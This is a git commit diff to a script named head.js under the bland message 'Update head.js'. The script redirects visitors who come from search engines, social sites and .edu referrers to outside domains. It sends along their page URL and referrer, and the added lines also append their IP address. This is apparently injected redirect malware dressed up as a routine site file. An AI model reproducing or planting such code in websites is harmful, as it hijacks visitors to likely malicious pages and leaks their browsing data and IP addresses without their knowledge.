4e3af7f03d42f6e224d7dbe1d65cd1e2ea047512
asking2794 <146243355+asking2794@users.noreply.github.com>
2025-02-10 23:49:16 +0700

    Update head.js

--- head.js
+++ head.js
@@ -2,8 +2,6 @@
 var arsT1Bing = 'https://blog.unimal.edu.pl';
 var arsT1Google = 'http://blog.ondasee.com';
 
-if(['google.'].some(s => document.referrer.toLowerCase().includes(s))){
-	window.location.href = arsT1Google + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer)
-}else if(['.edu.', 'google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
-	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer)
+if(['google.', '.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
+	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
 }
